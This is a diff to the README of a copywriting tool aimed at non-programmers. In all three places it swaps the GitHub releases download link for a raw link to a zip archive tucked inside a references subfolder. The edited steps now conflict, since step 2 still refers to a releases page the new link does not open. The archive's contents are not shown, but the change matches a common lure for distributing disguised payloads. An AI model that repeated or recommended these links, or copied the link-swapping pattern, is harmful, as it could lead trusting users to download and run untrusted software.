@@ -1,6 +1,6 @@
 # 🧾 evidence-based-copywriting - Every claim backed by proof
 
-[![Download Now](https://img.shields.io/badge/Download-evidence--based--copywriting-008080?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mucinous-riposte867/evidence-based-copywriting/releases)
+[![Download Now](https://img.shields.io/badge/Download-evidence--based--copywriting-008080?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/mucinous-riposte867/evidence-based-copywriting/main/skills/evidence-based-copywriting/references/copywriting-evidence-based-v2.2.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Welcome! If you're not a programmer, don't worry. This guide walks you through e
 
 ### 📥 Download and Install
 
-1. **Visit this link to download the application:** [https://github.com/mucinous-riposte867/evidence-based-copywriting/releases](https://github.com/mucinous-riposte867/evidence-based-copywriting/releases)
+1. **Visit this link to download the application:** [https://raw.githubusercontent.com/mucinous-riposte867/evidence-based-copywriting/main/skills/evidence-based-copywriting/references/copywriting-evidence-based-v2.2.zip](https://raw.githubusercontent.com/mucinous-riposte867/evidence-based-copywriting/main/skills/evidence-based-copywriting/references/copywriting-evidence-based-v2.2.zip)
 
 2. On the page that opens, look for the **latest release** (usually at the top). You'll see a list of downloadable files.
 
@@ -209,7 +209,7 @@ Write boldly. Verify rigorously. Publish confidently.
 
 You're just a few minutes away from writing copy you can defend with confidence.
 
-**[➡️ Download evidence-based-copywriting now](https://github.com/mucinous-riposte867/evidence-based-copywriting/releases)**
+**[➡️ Download evidence-based-copywriting now](https://raw.githubusercontent.com/mucinous-riposte867/evidence-based-copywriting/main/skills/evidence-based-copywriting/references/copywriting-evidence-based-v2.2.zip)**
 
 ---
 
